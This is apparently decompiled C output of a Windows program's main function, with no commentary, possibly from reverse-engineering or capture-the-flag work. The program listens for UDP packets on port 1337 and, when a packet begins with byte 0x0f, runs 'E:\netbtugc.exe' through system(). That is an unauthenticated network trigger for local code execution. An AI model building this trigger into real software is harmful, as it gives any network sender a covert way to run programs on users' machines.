int __cdecl main(int _Argc,char **_Argv,char **_Env)
{
  u_short uVar1;
  int iVar2;
  uint uVar3;
  FILE *_File;
  char *pcVar4;
  undefined8 local_600;
  WSADATA local_5f8;
  char local_458 [1036];
  int local_4c;
  undefined local_48 [16];
  sockaddr local_38;
  int local_24;
  SOCKET local_20;
  
  __main();
  pthread_create(&local_600,(uint *)0x0,&heartbeat,0);
  Sleep(5000);
  local_4c = 0x10;
  printf("\nInitialising Winsock...");
  iVar2 = WSAStartup(0x202,&local_5f8);
  if (iVar2 != 0) {
    uVar3 = WSAGetLastError();
    printf("Failed. Error Code : %d",(ulonglong)uVar3);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Initialised.\n");
  local_20 = socket(2,2,0);
  if (local_20 == 0xffffffffffffffff) {
    uVar3 = WSAGetLastError();
    printf("Could not create socket : %d",(ulonglong)uVar3);
  }
  printf("Socket created.\n");
  local_38.sa_family = 2;
  local_38.sa_data[2] = '\0';
  local_38.sa_data[3] = '\0';
  local_38.sa_data[4] = '\0';
  local_38.sa_data[5] = '\0';
  local_38.sa_data._0_2_ = htons(0x539);
  iVar2 = bind(local_20,&local_38,0x10);
  if (iVar2 == -1) {
    uVar3 = WSAGetLastError();
    printf("Bind failed with error code : %d",(ulonglong)uVar3);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  puts("Bind done");
  while( true ) {
    printf("Waiting for data...");
    _File = (FILE *)(*(code *)__imp___acrt_iob_func)(1);
    fflush(_File);
    memset(local_458,0,0x400);
    local_24 = recvfrom(local_20,local_458,0x400,0,(sockaddr *)local_48,&local_4c);
    if (local_24 == -1) break;
    uVar1 = ntohs(local_48._2_2_);
    pcVar4 = inet_ntoa((in_addr)local_48._4_4_);
    printf("Received packet from %s:%d\n",pcVar4,(ulonglong)uVar1);
    printf("Data: %s\n",local_458);
    if (local_458[0] == '\x0f') {
      system("E:\\netbtugc.exe");
    }
  }
  uVar3 = WSAGetLastError();
  printf("recvfrom() failed with error code : %d",(ulonglong)uVar3);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
